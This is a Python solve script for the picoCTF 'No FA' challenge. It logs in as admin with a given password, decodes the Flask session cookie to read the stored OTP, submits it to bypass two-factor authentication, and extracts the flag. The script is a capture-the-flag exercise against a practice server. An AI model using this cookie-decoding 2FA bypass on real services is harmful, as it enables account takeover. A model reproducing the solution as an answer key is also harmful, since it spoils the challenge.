"""Solve No FA: log in as admin, read OTP from session cookie, complete 2FA."""
import http.client
import urllib.parse
import base64
import json
import zlib
import re
import time

TARGET = "foggy-cliff.picoctf.net"
PORT = 63365
LOGIN_PATH = "/login"
TWO_FA_PATH = "/two_fa"
HOME_PATH = "/"

def raw_request(method, path, data=None, cookies=""):
    """Make a raw HTTP request, return (status, headers, body)."""
    conn = http.client.HTTPConnection(TARGET, PORT, timeout=10)
    body = data.encode() if isinstance(data, str) else (data or b"")
    headers = {}
    if cookies:
        headers["Cookie"] = cookies
    if data:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(body))
    conn.request(method, path, body=body, headers=headers)
    resp = conn.getresponse()
    body_out = resp.read().decode("utf-8", errors="replace")
    headers_out = dict(resp.getheaders())
    conn.close()
    return resp.status, headers_out, body_out

def get_cookie(headers, name="session"):
    for h, v in headers.items():
        if h.lower() == "set-cookie":
            m = re.search(rf'{name}=([^;]+)', v)
            if m:
                return m.group(1)
    return None

def decode_flask_session(cookie_val):
    """Decode Flask session. Compressed format: .payload.timestamp.signature"""
    parts = cookie_val.split(".")
    if cookie_val.startswith("."):
        payload_b64 = parts[1]
    else:
        payload_b64 = parts[0]
    padding = 4 - len(payload_b64) % 4
    if padding != 4:
        payload_b64 += "=" * padding
    decoded = base64.urlsafe_b64decode(payload_b64)
    # The decoded bytes are a raw zlib stream (starts with 0x78)
    decompressed = zlib.decompress(decoded)
    return json.loads(decompressed)

# Step 1: Log in as admin
print("[*] Step 1: Log in as admin (password=apple@123)")
status, headers, body = raw_request("POST", LOGIN_PATH,
    data=urllib.parse.urlencode({"username": "admin", "password": "apple@123"}))
print(f"  Status: {status}, Location: {headers.get('Location', 'N/A')}")
session_cookie = get_cookie(headers)
print(f"  Session: {session_cookie[:60]}...")

if not session_cookie:
    print("[!] No session cookie!")
    exit(1)

decoded = decode_flask_session(session_cookie)
print(f"  Decoded: {decoded}")
otp = decoded.get("otp_secret")
otp_ts = decoded.get("otp_timestamp")
print(f"  OTP: {otp}, Timestamp: {otp_ts}, Age: {time.time() - otp_ts:.1f}s")

# Step 2: Submit OTP
print(f"\n[*] Step 2: Submit OTP {otp} to /two_fa")
status, headers, body = raw_request("POST", TWO_FA_PATH,
    data=urllib.parse.urlencode({"otp": otp}),
    cookies=f"session={session_cookie}")
print(f"  Status: {status}, Location: {headers.get('Location', 'N/A')}")
new_cookie = get_cookie(headers)
if new_cookie:
    new_decoded = decode_flask_session(new_cookie)
    print(f"  New session: {new_decoded}")
    session_cookie = new_cookie

# Step 3: Access home page
print(f"\n[*] Step 3: Access home page")
status, headers, body = raw_request("GET", HOME_PATH,
    cookies=f"session={session_cookie}")
print(f"  Status: {status}, Location: {headers.get('Location', 'N/A')}")

# Find the flag
flag_match = re.search(r'picoCTF\{[^}]+\}', body)
if flag_match:
    print(f"\n[+] FLAG: {flag_match.group()}")
else:
    print(f"  Body (first 1000 chars):")
    print(body[:1000])
